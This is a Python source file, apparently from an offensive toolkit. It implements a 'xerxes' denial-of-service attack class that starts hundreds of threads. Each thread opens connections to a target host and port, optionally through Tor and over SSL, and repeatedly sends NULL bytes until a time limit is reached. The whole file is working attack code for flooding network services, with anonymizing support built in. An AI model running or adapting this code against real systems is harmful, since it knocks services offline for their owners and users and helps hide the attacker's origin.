from bane.ddos.utils import *

class xerxes(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        threads_daemon=True,
        threads=500,
        timeout=5,
        duration=60,
        logs=False,
        tor=False,
        ssl_on=False
    ):
        self.ssl_on=ssl_on
        self.counter = 0
        self.target = u
        self.port = p
        self.stop = False
        self.duration = duration
        self.timeout = timeout
        self.tor = tor
        self.start = time.time()
        self.logs = logs
        self.id_key = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
                self.id_key += 1
            except:
                pass

    def attack(self):
        try:
            x = self.id_key
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    if self.tor==True:
                        s=get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
                    else:
                        s=get_socket_connection(self.target,self.port,timeout=self.timeout)
                    if self.port==443 or self.ssl_on==True:
                        s=wrap_socket_with_ssl(s,self.target)
                    self.counter += 1
                    """if self.logs==True:
     #print("[Connected to {}:{}]".format(self.target,self.port))
     sys.stdout.write("\r[Connected to {}:{}]".format(self.target,self.port))
     sys.stdout.flush()"""
                    while True:
                        if (
                            int(time.time() - self.start) >= self.duration
                        ):  # this is a safety mechanism so the attack won't run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send("\x00".encode("utf-8"))  # send NULL character
                            if self.logs == True:
                                sys.stdout.write("\r[{}: Voly sent]    ".format(x))
                                sys.stdout.flush()
                        except:
                            break
                        time.sleep(0.2)
                except:
                    pass
                self.counter -= 1
                time.sleep(0.3)
            self.kill()
        except:
            pass
